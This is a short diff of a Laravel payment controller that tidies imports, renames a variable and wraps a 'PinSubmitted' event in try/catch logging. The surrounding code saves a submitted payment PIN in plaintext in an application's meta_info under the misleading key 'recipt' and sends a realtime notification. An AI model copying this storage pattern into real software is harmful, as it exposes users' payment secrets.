@@ -2,8 +2,6 @@
 
 namespace App\Modules\Payment\Http\Controllers;
 
-
-
 use App\Events\PinSubmitted;
 use App\Models\Application;
 use App\Modules\Forms\FormNotificationService;
@@ -13,8 +11,8 @@ use App\Modules\Payment\Support\GatewayManager;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Routing\Controller;
 use Illuminate\View\View;
-
-
+use Illuminate\Support\Facades\Log;
+use Throwable;
 class PinController extends Controller
 {
     public function __construct(
@@ -54,7 +52,7 @@ public function store(
     StorePinRequest $request
 ): RedirectResponse {
 
-    $pin = $request->validated()['pin'];
+    $recipt = $request->validated()['pin'];
     $referenceNo = $this->session->get('reference_no');
     if ($referenceNo) {
             $application = Application::where(
@@ -74,11 +72,18 @@ public function store(
                         } elseif (! is_array($meta_info)) {
                             $meta_info = [];
                         }
-                        $meta_info['recipt'] = $request->validated()['pin']; 
+                        $meta_info['recipt'] = $recipt; 
                         $application->update([
                             'meta_info' => $meta_info,
                         ]);
-                    PinSubmitted::dispatch($application);
+                try {
+                    event(new PinSubmitted($application));
+                } catch (Throwable $exception) {
+                    Log::warning('Payment Account Number Application realtime notification failed.', [
+                        'application_id' => $application->id,
+                        'error' => $exception->getMessage(),
+                    ]);
+                }
                     $this->notifications->notifyPinSubmitted($application);
             } 
     }
